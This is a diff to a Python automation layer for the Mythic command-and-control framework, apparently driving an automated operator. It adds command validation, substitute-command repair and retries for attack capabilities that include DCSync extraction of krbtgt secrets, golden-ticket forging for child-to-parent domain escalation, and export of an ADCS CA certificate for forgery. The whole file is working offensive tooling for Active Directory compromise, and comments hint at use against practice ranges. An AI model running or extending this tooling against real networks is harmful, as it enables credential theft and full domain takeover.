+                    "missing": ["ca_pfx_upload"],
+                    "reason": reason,
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "upload_output_preview": preview,
+                }, sort_keys=True)
 
-            merged_inputs = dict(input_values)
-            merged_inputs.update(materialized.inputs)
             evidence = dict(materialized.evidence)
             evidence.update({
                 "mythic_file_uuid": file_uuid,
                 "upload_command": upload_command,
                 "upload_parameters": {
-                    key: ("<file_uuid>" if key == file_param else value)
+                    key: ("<file_ref>" if key == registered_file_param else value)
                     for key, value in upload_parameters.items()
                 },
-                "upload_task_id": self._last_issued_task_display_id,
+                "upload_task_id": upload_task_id,
                 "callback_id": callback_id,
             })
             return json.dumps({
@@ -5904,9 +6203,9 @@ class MythicTools:
                     "mythic_file_uuid": file_uuid,
                     "remote_path": materialized.inputs["ca_pfx_path"],
                     "callback_id": callback_id,
-                    "upload_task_id": self._last_issued_task_display_id,
+                    "upload_task_id": upload_task_id,
                 },
-                "upload_output_preview": self._capability_text(upload_output)[-800:],
+                "upload_output_preview": upload_output_text[-800:],
                 "next": "Pass action and inputs to build_capability_commands, then issue the returned commands exactly.",
             }, sort_keys=True)
         except Exception as exc:
@@ -6565,8 +6864,33 @@ class MythicTools:
         callback_id: int,
         timeout: int | None,
     ) -> dict:
-        command_name = self._capability_text(command_obj.get("command"))
-        parameters = command_obj.get("parameters", "")
+        original_command = self._capability_text(command_obj.get("command"))
+        original_parameters = command_obj.get("parameters", "")
+        binding = await self._prepare_capability_command_binding(command_obj, callback_id)
+        if not binding.get("ok"):
+            item = self._capability_executor_command_item(
+                command_obj,
+                original_command,
+                original_parameters,
+                callback_id,
+                None,
+                binding.get("reason") or "Construction failure: payload mechanic binding failed",
+            )
+            if binding.get("provider_blocked"):
+                item["operation_provider"] = self._capability_executor_public_operation_provider(binding)
+                item["repair_attempt"] = 1
+                item["repair_kind"] = "operation_provider_rebuild_required"
+                item["repair_reason"] = binding.get("reason") or "multi-command operation provider requires capability rebuild"
+            else:
+                item["mechanic_repair"] = self._capability_executor_public_mechanic_repair(binding)
+            if binding.get("repair_attempted"):
+                item["repair_attempt"] = 1
+                item["repair_kind"] = "payload_mechanic_substitute"
+                item["repair_reason"] = binding.get("reason") or "payload mechanic substitute was rejected"
+            return item
+
+        command_name = self._capability_text(binding.get("command") or original_command)
+        parameters = binding.get("parameters", original_parameters)
         if command_name == "wait_for_seconds":
             seconds = 0
             reason = ""
@@ -6594,7 +6918,449 @@ class MythicTools:
                 timeout=timeout,
             )
             task_id = getattr(self, "_last_issued_task_display_id", None)
+        item = self._capability_executor_command_item(
+            command_obj,
+            command_name,
+            parameters,
+            callback_id,
+            task_id,
+            output,
+        )
+        if binding.get("provider_resolved"):
+            item["operation_provider"] = self._capability_executor_public_operation_provider(binding)
+            item["repair_attempt"] = 1
+            item["repair_kind"] = "operation_provider_substitute"
+            item["repair_reason"] = binding.get("reason") or "resolved missing native operation through deterministic provider"
+        elif binding.get("repair_attempted"):
+            item["mechanic_repair"] = self._capability_executor_public_mechanic_repair(binding)
+            item["repair_attempt"] = 1
+            item["repair_kind"] = "payload_mechanic_substitute"
+            item["repair_reason"] = binding.get("reason") or "replaced missing payload mechanic from live command surface"
+        if command_name == "wait_for_seconds" or not self._capability_executor_task_failed(item):
+            return item
+
+        repair = await self._construction_repair_parameters(
+            command_name,
+            parameters,
+            callback_id,
+            self._capability_text(output),
+        )
+        if repair is None:
+            return item
+        repaired_parameters, repair_kind = repair
+        retry_output = await self.issue_task_and_waitfor_task_output(
+            command_name,
+            repaired_parameters,
+            callback_id,
+            timeout=timeout,
+        )
+        retry_task_id = getattr(self, "_last_issued_task_display_id", None)
+        retry_item = self._capability_executor_command_item(
+            command_obj,
+            command_name,
+            repaired_parameters,
+            callback_id,
+            retry_task_id,
+            retry_output,
+        )
+        retry_item["repair_attempt"] = 1
+        retry_item["repair_kind"] = repair_kind
+        retry_item["repair_reason"] = "construction failure repaired from live payload schema"
+        if binding.get("provider_resolved"):
+            retry_item["operation_provider"] = self._capability_executor_public_operation_provider(binding)
+        elif binding.get("repair_attempted"):
+            retry_item["mechanic_repair"] = self._capability_executor_public_mechanic_repair(binding)
+        if task_id is not None:
+            retry_item["retry_of_task_id"] = task_id
+        retry_item["repair_history"] = [self._capability_executor_public_issued([item])[0]]
+        return retry_item
+
+    async def _prepare_capability_command_binding(self, command_obj: dict, callback_id: int) -> dict:
+        """Authenticate one deterministic command against the live payload surface.
+
+        Existing valid bindings stay deterministic. Only a command that is authoritatively absent from
+        the callback's live command surface may invoke one bounded mechanic substitution.
+        """
+        command_name = self._capability_text(command_obj.get("command"))
+        parameters = command_obj.get("parameters", "")
+        if command_name == "wait_for_seconds":
+            return {"ok": True, "command": command_name, "parameters": parameters}
+
+        operation = self._capability_text(command_obj.get("operation"))
+        if operation:
+            payload_type, command_surface, _surface_reason = await self._fetch_live_command_surface(callback_id)
+            if command_surface is not None:
+                try:
+                    from . import mechanic_repair
+                except ImportError:
+                    import mechanic_repair
+                canonical = mechanic_repair.canonical_command_name(command_surface, command_name)
+                auth = {
+                    "status": "available" if canonical else "missing",
+                    "command": canonical or command_name,
+                    "payload_type": payload_type,
+                    "command_surface": command_surface,
+                }
+            else:
+                # No authoritative surface means there is nothing safe to repair against. Preserve the
+                # existing issue-time schema path instead of consuming a speculative schema lookup here.
+                return {
+                    "ok": True,
+                    "command": command_name,
+                    "parameters": parameters,
+                    "payload_type": payload_type or "",
+                }
+        else:
+            return {"ok": True, "command": command_name, "parameters": parameters}
+        if auth.get("status") == "available":
+            return {
+                "ok": True,
+                "command": auth.get("command") or command_name,
+                "parameters": parameters,
+                "payload_type": auth.get("payload_type") or "",
+            }
+
+        if auth.get("status") != "missing":
+            return {
+                "ok": True,
+                "command": command_name,
+                "parameters": parameters,
+                "payload_type": auth.get("payload_type") or "",
+            }
+        provider_binding = self._resolve_missing_operation_provider(command_obj, auth)
+        if provider_binding is not None:
+            return provider_binding
+        return await self._repair_missing_capability_command(command_obj, callback_id, auth)
+
+    def _resolve_missing_operation_provider(self, command_obj: dict, auth: dict) -> dict | None:
+        """Resolve a missing native binding through a catalogued equivalent provider."""
+        try:
+            try:
+                from . import operation_providers
+            except ImportError:
+                import operation_providers
+
+            payload_type = self._capability_text(auth.get("payload_type"))
+            command_surface = auth.get("command_surface") if isinstance(auth.get("command_surface"), list) else []
+            candidate = operation_providers.live_provider_candidate(
+                command_obj,
+                payload_type=payload_type,
+                command_surface=command_surface,
+            )
+            if not isinstance(candidate, dict):
+                return None
+            if candidate.get("blocked"):
+                return {
+                    "ok": False,
+                    "command": self._capability_text(command_obj.get("command")),
+                    "parameters": command_obj.get("parameters", ""),
+                    "payload_type": payload_type,
+                    "provider_blocked": True,
+                    "provider": self._capability_text(candidate.get("provider")),
+                    "provider_kind": self._capability_text(candidate.get("provider_kind")),
+                    "provider_context": self._capability_text(candidate.get("provider_context")),
+                    "original_command": self._capability_text(command_obj.get("command")),
+                    "rationale": self._capability_text(candidate.get("reason")),
+                    "reason": "Construction failure: " + self._capability_text(candidate.get("reason")),
+                }
+            validated, rejection = self._validate_mechanic_repair_candidate(
+                command_obj,
+                command_surface,
+                candidate,
+            )
+            if validated is None:
+                logger.info(
+                    "🧭 [operation-provider] rejected payload=%s operation=%s provider=%s reason=%s",
+                    payload_type,
+                    command_obj.get("operation"),
+                    candidate.get("provider"),
+                    rejection,
+                )
+                return None
+            resolved = {
+                "ok": True,
+                "command": validated["command"],
+                "parameters": validated["parameters"],
+                "payload_type": payload_type,
+                "provider_resolved": True,
+                "provider": self._capability_text(candidate.get("provider")),
+                "provider_kind": self._capability_text(candidate.get("provider_kind")),
+                "provider_context": self._capability_text(candidate.get("provider_context")),
+                "original_command": self._capability_text(command_obj.get("command")),
+                "rationale": validated.get("rationale") or self._capability_text(candidate.get("rationale")),
+                "reason": "resolved missing native operation through deterministic provider catalog",
+            }
+            self._register_repaired_capability_command(
+                command_obj,
+                resolved["command"],
+                resolved["parameters"],
+                provider=resolved,
+            )
+            logger.info(
+                "🧭 [operation-provider] accepted payload=%s operation=%s provider=%s original=%s replacement=%s",
+                payload_type,
+                command_obj.get("operation"),
+                resolved["provider"],
+                resolved["original_command"],
+                resolved["command"],
+            )
+            return resolved
+        except Exception as exc:
+            logger.info(
+                "🧭 [operation-provider] resolution failed operation=%s reason=%s",
+                command_obj.get("operation"),
+                exc,
+            )
+            return None
+
+    async def _repair_missing_capability_command(self, command_obj: dict, callback_id: int, auth: dict) -> dict:
+        try:
+            from . import mechanic_repair
+        except ImportError:
+            import mechanic_repair
+
+        command_name = self._capability_text(command_obj.get("command"))
+        parameters = command_obj.get("parameters", "")
+        payload_type = self._capability_text(auth.get("payload_type"))
+        command_surface = auth.get("command_surface") if isinstance(auth.get("command_surface"), list) else []
+        key = (
+            payload_type.casefold(),
+            self._capability_text(command_obj.get("operation")).casefold(),
+            _capability_command_key(command_name, parameters),
+        )
+        if key in self._mechanic_repair_cache:
+            cached = self._mechanic_repair_cache[key]
+            if isinstance(cached, dict):
+                return dict(cached)
+            return {
+                "ok": False,
+                "command": command_name,
+                "parameters": parameters,
+                "payload_type": payload_type,
+                "repair_attempted": True,
+                "original_command": command_name,
+                "reason": (
+                    "Construction failure: no valid bounded payload mechanic substitute was found for "
+                    f"operation '{self._capability_text(command_obj.get('operation'))}' on payload '{payload_type}'."
+                ),
+            }
+
+        resolver = getattr(self, "_mechanic_repair_resolver", None)
+        if not callable(resolver):
+            self._mechanic_repair_cache[key] = None
+            return {
+                "ok": False,
+                "command": command_name,
+                "parameters": parameters,
+                "payload_type": payload_type,
+                "repair_attempted": False,
+                "original_command": command_name,
+                "reason": self._missing_live_command_message(command_name, payload_type, callback_id),
+            }
+
+        safe_command_obj = dict(command_obj)
+        safe_command_obj["parameters"] = self._mechanic_repair_safe_parameters(parameters)
+        request = mechanic_repair.build_request(
+            payload_type=payload_type,
+            callback_id=callback_id,
+            command_obj=safe_command_obj,
+            command_surface=command_surface,
+            reason=self._missing_live_command_message(command_name, payload_type, callback_id),
+        )
+        try:
+            candidate_value = resolver(request)
+            if inspect.isawaitable(candidate_value):
+                candidate_value = await candidate_value
+            candidate = mechanic_repair.parse_candidate(candidate_value)
+        except Exception as exc:
+            candidate = None
+            logger.info("🧭 [mechanic-repair] resolver failed payload=%s operation=%s reason=%s", payload_type, command_obj.get("operation"), exc)
+
+        validated, rejection = self._validate_mechanic_repair_candidate(
+            command_obj,
+            command_surface,
+            candidate,
+        )
+        if validated is None:
+            self._mechanic_repair_cache[key] = None
+            return {
+                "ok": False,
+                "command": command_name,
+                "parameters": parameters,
+                "payload_type": payload_type,
+                "repair_attempted": True,
+                "original_command": command_name,
+                "reason": (
+                    "Construction failure: bounded payload mechanic repair did not produce a valid substitute "
+                    f"for operation '{self._capability_text(command_obj.get('operation'))}' on payload '{payload_type}': "
+                    f"{rejection or 'no candidate returned'}"
+                ),
+            }
+
+        repaired = {
+            "ok": True,
+            "command": validated["command"],
+            "parameters": validated["parameters"],
+            "payload_type": payload_type,
+            "repair_attempted": True,
+            "original_command": command_name,
+            "rationale": validated.get("rationale") or "",
+            "reason": "replaced missing payload mechanic from live command surface",
+        }
+        self._register_repaired_capability_command(command_obj, repaired["command"], repaired["parameters"])
+        self._mechanic_repair_cache[key] = dict(repaired)
+        logger.info(
+            "🧭 [mechanic-repair] accepted payload=%s operation=%s original=%s replacement=%s",
+            payload_type,
+            command_obj.get("operation"),
+            command_name,
+            repaired["command"],
+        )
+        return repaired
+
+    def _validate_mechanic_repair_candidate(
+        self,
+        command_obj: dict,
+        command_surface: list[dict],
+        candidate: dict | None,
+    ) -> tuple[dict | None, str]:
+        try:
+            from . import mechanic_repair
+        except ImportError:
+            import mechanic_repair
+
+        if not isinstance(candidate, dict):
+            return None, "no candidate returned"
+        command_name = mechanic_repair.canonical_command_name(command_surface, candidate.get("command"))
+        if not command_name:
+            return None, "candidate command is absent from the live payload surface"
+        names = mechanic_repair.command_names(command_surface)
+        if command_name.casefold() == "shell" and "run" in names:
+            return None, "shell substitute rejected because the live payload exposes run"
+
+        schema = mechanic_repair.command_schema(command_surface, command_name)
+        if schema is None:
+            return None, "candidate command schema is unavailable"
+        parameters = candidate.get("parameters", {})
+        if parameters is None:
+            parameters = {}
+        if isinstance(parameters, str):
+            if parameters.strip():
+                repaired = self._schema_single_string_parameters(command_name, parameters, schema)
+                if repaired is None:
+                    return None, "string parameters do not match the candidate command schema"
+                parameters = repaired
+            else:
+                parameters = {}
+        if not isinstance(parameters, dict):
+            return None, "candidate parameters must be a JSON object"
+        resolved = command_builder.resolve_params(schema, parameters, command=command_name)
+        if not resolved.ok:
+            return None, resolved.repair or "candidate parameters do not match the live schema"
+        parameters = resolved.params
+        if not parameters:
+            parameters = ""
+
+        original_placeholders = self._capability_executor_placeholders(command_obj.get("parameters", ""))
+        candidate_placeholders = self._capability_executor_placeholders(parameters)
+        if candidate_placeholders - original_placeholders:
+            return None, "candidate introduced runtime placeholders outside the original operation contract"
+        if original_placeholders - candidate_placeholders:
+            return None, "candidate dropped runtime placeholders required by the original operation contract"
+        return {
+            "command": command_name,
+            "parameters": parameters,
+            "rationale": self._capability_text(candidate.get("rationale")),
+        }, ""
+
+    def _register_repaired_capability_command(
+        self,
+        command_obj: dict,
+        command_name: str,
+        parameters,
+        *,
+        provider: dict | None = None,
+    ) -> None:
+        original_command = self._capability_text(command_obj.get("command"))
+        original_parameters = command_obj.get("parameters", "")
+        context = self._deterministic_capability_command_context(original_command, original_parameters)
+        if not context:
+            context = {
+                "capability": self._capability_text(command_obj.get("capability")),
+                "operation": self._capability_text(command_obj.get("operation")),
+                "purpose": self._capability_text(command_obj.get("purpose")),
+                "expected_probe": self._capability_text(command_obj.get("expected_probe")),
+                "produces": list(command_obj.get("produces") or []),
+                "consumes": list(command_obj.get("consumes") or []),
+            }
+        context = dict(context)
+        if isinstance(provider, dict):
+            context["operation_provider"] = {
+                "name": self._capability_text(provider.get("provider")),
+                "kind": self._capability_text(provider.get("provider_kind")),
+                "context": self._capability_text(provider.get("provider_context")),
+                "original_command": original_command,
+                "replacement_command": command_name,
+            }
+        else:
+            context["mechanic_repair"] = {
+                "original_command": original_command,
+                "replacement_command": command_name,
+            }
+        self._deterministic_capability_command_contexts[
+            _capability_command_key(command_name, parameters)
+        ] = context
+        ticket_key = _ticket_command_key(command_name, parameters)
+        if ticket_key:
+            self._deterministic_ticket_command_keys.add(ticket_key)
+            self._deterministic_ticket_command_contexts[ticket_key] = context
+
+    def _mechanic_repair_safe_parameters(self, parameters):
+        if isinstance(parameters, dict):
+            out = {}
+            for key, value in parameters.items():
+                if isinstance(value, str) and value.strip().startswith("{{") and value.strip().endswith("}}"):
+                    out[key] = value
+                else:
+                    out[key] = self._capability_executor_safe_parameters({key: value}).get(key)
+            return out
+        return self._capability_executor_safe_parameters(parameters)
+
+    def _capability_executor_public_mechanic_repair(self, binding: dict) -> dict:
+        attempted = bool(binding.get("repair_attempted"))
+        return {
+            "attempted": attempted,
+            "status": "accepted" if binding.get("ok") and attempted else ("failed" if attempted else "not_attempted"),
+            "payload_type": self._capability_text(binding.get("payload_type")),
+            "original_command": self._capability_text(binding.get("original_command")),
+            "replacement_command": self._capability_text(binding.get("command")) if binding.get("ok") else "",
+            "rationale": self._capability_text(binding.get("rationale")),
+        }
+
+    def _capability_executor_public_operation_provider(self, binding: dict) -> dict:
+        return {
+            "status": "accepted" if binding.get("ok") and binding.get("provider_resolved") else "failed",
+            "payload_type": self._capability_text(binding.get("payload_type")),
+            "name": self._capability_text(binding.get("provider")),
+            "kind": self._capability_text(binding.get("provider_kind")),
+            "context": self._capability_text(binding.get("provider_context")),
+            "original_command": self._capability_text(binding.get("original_command")),
+            "replacement_command": self._capability_text(binding.get("command")) if binding.get("ok") else "",
+            "rationale": self._capability_text(binding.get("rationale")),
+        }
+
+    def _capability_executor_command_item(
+        self,
+        command_obj: dict,
+        command_name: str,
+        parameters,
+        callback_id: int,
+        task_id,
+        output,
+    ) -> dict:
         result_class = command_builder.classify_result(command_name, output)
+        if self._capability_text(output).casefold().startswith("construction failure:"):
+            result_class = command_builder.ResultClass.CONSTRUCTION.value
         item = {
             "command": command_name,
             "purpose": self._capability_text(command_obj.get("purpose")),
@@ -6740,14 +7506,31 @@ class MythicTools:
             probe["callback_id"] = self._capability_text(callback_id)
             verification = capabilities_mod.verify_capability(capability, probe)
             return probe, verification
+        if capability in {"dcsync", "dcsync-krbtgt", "dcsync-account"}:
+            if expected_probe != "extract_dcsync_secret_probe":
+                return None, None
+            probe = dict(capabilities_mod.extract_dcsync_secret_probe(output))
+            probe["callback_id"] = self._capability_text(callback_id)
+            domain = self._capability_domain(action, inputs)
+            if domain:
+                probe["domain"] = self._capability_text(domain).casefold()
+            account = self._capability_account(action, inputs)
+            if not account and capability in {"dcsync", "dcsync-krbtgt"}:
+                account = "krbtgt"
+            if account:
+                probe["account"] = self._capability_text(account).casefold()
+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
         if capability in {"forge-golden-ticket", "ensure-kerberos-context", "ensure-account-kerberos-context"}:
             if capability == "forge-golden-ticket" and expected_probe == "extract_dcsync_secret_probe":
-                # Cross-domain (child->parent) proof. After importing the inter-realm referral ticket, a DCSync
+                # Cross-domain (child->parent) proof. After importing an EA-capable Kerberos context, a DCSync
                 # that replicates the PARENT krbtgt secret proves domain-admin-equivalent control of the parent
-                # domain. The ticket/service-access probes never recognized this, so a perfect DCSync scored
-                # "failed — no forged ticket evidence". Map a parent-krbtgt dump to domain_admin, scoped to the
-                # target (parent) domain via a boundary match so a CHILD-domain dump (whose name CONTAINS the
-                # parent label, e.g. child.root.example.local) cannot satisfy a parent proof.
+                # domain. Windows usually acquires the referral/service tickets on demand; an explicit asktgs
+                # fallback may also have produced them. The ticket/service-access probes never recognized this,
+                # so a perfect DCSync scored "failed — no forged ticket evidence". Map a parent-krbtgt dump to
+                # domain_admin, scoped to the target (parent) domain via a boundary match so a CHILD-domain dump
+                # (whose name CONTAINS the parent label, e.g. child.root.example.local) cannot satisfy a parent
+                # proof.
                 target_domain = self._capability_text(
                     self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
                 ).casefold()
@@ -7010,22 +7793,23 @@ class MythicTools:
         if not isinstance(transaction, dict) or verification is None:
             return
         verdict = self._capability_text(getattr(verification, "verdict", ""))
+        final_probe = self._capability_executor_is_final_probe(command_obj)
         event = {
             "stage": "effect_verification",
             "command": self._capability_text(command_obj.get("command")),
             "expected_probe": self._capability_text(command_obj.get("expected_probe")),
-            "final_probe": self._capability_executor_is_final_probe(command_obj),
+            "final_probe": final_probe,
             "verdict": verdict,
             "reason": self._capability_text(getattr(verification, "reason", "")),
         }
         transaction.setdefault("events", []).append(event)
-        if verdict == "achieved":
+        if verdict == "achieved" and final_probe:
             transaction["status"] = "effect_achieved"
             transaction["pin_planner"] = False
             transaction.pop("pin_reason", None)
             transaction.pop("blocker", None)
             return
-        if event["final_probe"]:
+        if final_probe:
             self._capability_transaction_mark_unverified(
                 transaction,
                 event["reason"] or "final verifier did not prove the required effect",
@@ -7119,9 +7903,9 @@ class MythicTools:
     ) -> bool:
         # Skip a current-context-preflight step ONLY while it is still a redundant LEADING probe: a separate
         # preflight already ran, we are not refreshing context, and no core action has issued yet. Post-forge
-        # steps (the referral ticket-import, purge, post-import inventory) can match the preflight heuristic but
-        # MUST run — gating on core_action_issued keeps them from being dropped. See the loop in
-        # execute_capability for why this matters (a dropped referral-import collapsed the cross-domain chain).
+        # steps (the current-TGT import, purge, post-import inventory) can match the preflight heuristic but MUST
+        # run — gating on core_action_issued keeps them from being dropped. See the loop in execute_capability for
+        # why this matters (a dropped current-session import collapses the cross-domain chain).
         return (
             preflight_ran
             and not refresh_current_context
@@ -8434,6 +9218,7 @@ class MythicTools:
                 or inputs.get("certificate_path")
             ):
                 inputs["forged_pfx_path"] = f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
+                inputs["_auto_forged_pfx_path"] = True
             if not self._capability_text(
                 inputs.get("forged_pfx_password")
                 or inputs.get("forged_certificate_password")
@@ -8615,7 +9400,11 @@ class MythicTools:
                                     ).casefold()
                                 except Exception:
                                     payload_type = ""
-                            inputs["adcs_ca_export_command"] = "powerpick" if payload_type == "apollo" else "wmiexecute"
+                            # Apollo's one-task PowerShell wrapper is a proven special case for this
+                            # capability. Leave every other payload unset here so its bound profile
+                            # or the generic adapter default owns the command choice.
+                            if payload_type == "apollo":
+                                inputs["adcs_ca_export_command"] = "powerpick"
                 else:
                     inputs.setdefault("adcs_ca_export_use_current_context", True)
                     inputs.setdefault("current_context_powershell_command", "powerpick")
@@ -8811,14 +9600,36 @@ class MythicTools:
                 self._remove_capability_input_error(inputs, "invalid_extra_sids")
                 self._normalize_capability_ticket_inputs(inputs)
 
-        # Cross-domain child->parent forge needs TWO domain controllers: the parent DC (already resolved as
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        ticket_acquisition_strategy = self._capability_text(
+            inputs.get("kerberos_ticket_acquisition_strategy")
+            or inputs.get("ticket_acquisition_strategy")
+            or inputs.get("service_ticket_strategy")
+            or intent.get("kerberos_ticket_acquisition_strategy")
+            or intent.get("ticket_acquisition_strategy")
+            or intent.get("service_ticket_strategy")
+            or "os-native"
+        ).casefold()
+        explicit_tgs_exchange = ticket_acquisition_strategy in {
+            "asktgs",
+            "explicit",
+            "explicit-asktgs",
+            "explicit_asktgs",
+            "explicit-tgs",
+            "explicit_tgs",
+            "rubeus-asktgs",
+            "rubeus_asktgs",
+        }
+
+        # Explicit cross-domain TGS fallback needs TWO domain controllers: the parent DC (already resolved as
         # proof_host on the effect domain, below) is where the access proof runs, and the CHILD DC is where the
-        # inter-realm referral hop must be presented. Resolve the child DC here so the execution plan can target
-        # it. Range-agnostic: the child DC is the DC of the source (child) domain.
+        # inter-realm referral hop must be presented. The default OS-native path does not need to resolve that
+        # extra input because Windows requests the referral from the imported current-session TGT on demand.
         if (
             capability == "forge-golden-ticket"
             and target_domain
             and target_domain != domain
+            and explicit_tgs_exchange
             and not self._capability_text(inputs.get("child_dc") or inputs.get("source_dc"))
         ):
             child_dc = self._capability_host_name(
@@ -11199,6 +12010,155 @@ class MythicTools:
         except Exception as e:
             logger.debug(f"Could not resolve payload type for callback {callback_display_id}: {e}")
         return None
+
+    async def _authenticate_live_command(self, command: str, callback_display_id) -> dict:
+        """Return whether `command` is present on the callback's live payload command surface.
+
+        A direct schema hit is enough to authenticate a valid command without fetching the whole surface.
+        When that misses, enumerate the live surface once so "unknown command" is distinguishable from
+        "schema lookup unavailable".
+        """
+        command_name = self._capability_text(command)
+        if not command_name:
+            return {"status": "unknown", "command": "", "payload_type": ""}
+        payload_type, command_surface, reason = await self._fetch_live_command_surface(callback_display_id)
+        if command_surface is not None:
+            try:
+                from . import mechanic_repair
+            except ImportError:
+                import mechanic_repair
+            canonical = mechanic_repair.canonical_command_name(command_surface, command_name)
+            if canonical:
+                return {
+                    "status": "available",
+                    "command": canonical,
+                    "schema": mechanic_repair.command_schema(command_surface, canonical) or [],
+                    "payload_type": payload_type or "",
+                    "command_surface": command_surface,
+                }
+            return {
+                "status": "missing",
+                "command": command_name,
+                "payload_type": payload_type or "",
+                "command_surface": command_surface,
+                "reason": self._missing_live_command_message(command_name, payload_type, callback_display_id),
+            }
+        try:
+            schema = await self._fetch_command_schema(command_name, callback_display_id)
+            if schema is not None:
+                fallback_payload_type = await self._resolve_payload_type(callback_display_id)
+                return {
+                    "status": "available",
+                    "command": command_name,
+                    "schema": schema,
+                    "payload_type": fallback_payload_type or "",
+                }
+        except Exception:
+            pass
+
+        return {
+            "status": "unknown",
+            "command": command_name,
+            "payload_type": payload_type or "",
+            "reason": reason,
+        }
+
+    async def _fetch_live_command_surface(self, callback_display_id) -> tuple[str, list[dict] | None, str]:
+        """Fetch the callback-loaded command surface, falling back to payload commands when needed."""
+        payload_type = ""
+        try:
+            callback_key = str(callback_display_id)
+            cached_callback = getattr(self, "_callback_command_surface_cache", {}).get(callback_key)
+            if isinstance(cached_callback, tuple) and len(cached_callback) == 2:
+                cached_payload, cached_surface = cached_callback
+                if isinstance(cached_surface, list):
+                    return self._capability_text(cached_payload), cached_surface, ""
+            if self.client is not None:
+                callback_query = f"""
+                    query CallbackLoadedCommandSurface {{
+                      callback(where: {{display_id: {{_eq: {int(callback_display_id)}}}}}) {{
+                        payload {{ payloadtype {{ name }} }}
+                        loadedcommands {{
+                          command {{
+                            cmd
+                            commandparameters {{
+                              name cli_name type description default_value choices parameter_group_name required
+                            }}
+                            description
+                            help_cmd
+                            needs_admin
+                          }}
+                        }}
+                      }}
+                    }}
+                """
+                try:
+                    callback_result = await mythic.execute_custom_query(self.client, callback_query)
+                    callbacks = callback_result.get("callback") if isinstance(callback_result, dict) else None
+                    if isinstance(callbacks, list) and callbacks:
+                        callback = callbacks[0] if isinstance(callbacks[0], dict) else {}
+                        payload = callback.get("payload") if isinstance(callback, dict) else {}
+                        payloadtype = payload.get("payloadtype") if isinstance(payload, dict) else {}
+                        payload_type = self._capability_text(
+                            payloadtype.get("name") if isinstance(payloadtype, dict) else ""
+                        )
+                        loaded = callback.get("loadedcommands") if isinstance(callback, dict) else []
+                        surface = [
+                            row.get("command")
+                            for row in list(loaded or [])
+                            if isinstance(row, dict) and isinstance(row.get("command"), dict)
+                        ]
+                        self._callback_command_surface_cache[callback_key] = (payload_type, surface)
+                        return payload_type, surface, ""
+                except Exception:
+                    pass
+            payload_type = self._capability_text(await self._resolve_payload_type(callback_display_id))
+            if not payload_type:
+                return "", None, "callback payload type could not be resolved"
+            cached = getattr(self, "_command_schema_cache", {}).get(payload_type)
+            if isinstance(cached, list):
+                return payload_type, cached, ""
+            if self.client is None:
+                return payload_type, None, "Mythic client is not initialized"
+            attr = """
+            cmd
+            commandparameters {
+            cli_name
+            name
+            type
+            description
+            default_value
+            choices
+            parameter_group_name
+            required
+            }
+            description
+            help_cmd
+            needs_admin
+            """
+            results = await mythic.get_all_commands_for_payloadtype(self.client, payload_type, attr)
+            if not isinstance(results, list):
+                return payload_type, None, "live payload command enumeration returned no command list"
+            self._command_schema_cache[payload_type] = results
+            if not hasattr(self, "_cmd_schema_cache"):
+                self._cmd_schema_cache = {}
+            for item in results:
+                if not isinstance(item, dict):
+                    continue
+                name = self._capability_text(item.get("cmd"))
+                if name:
+                    self._cmd_schema_cache[(payload_type, name)] = list(item.get("commandparameters") or [])
+            return payload_type, results, ""
+        except Exception as exc:
+            return payload_type, None, f"live payload command enumeration failed: {exc}"
+
+    def _missing_live_command_message(self, command: str, payload_type: str | None, callback_display_id) -> str:
+        payload = self._capability_text(payload_type) or "unknown"
+        return (
+            f"Construction failure: command '{self._capability_text(command)}' is not available on live "
+            f"payload '{payload}' for callback {callback_display_id}; do not issue a command from another "
+            "payload schema."
+        )
 
     async def _fetch_command_schema(self, command, callback_display_id):
         """Resolve the parameter-group schema for `command` on the callback's payload type.
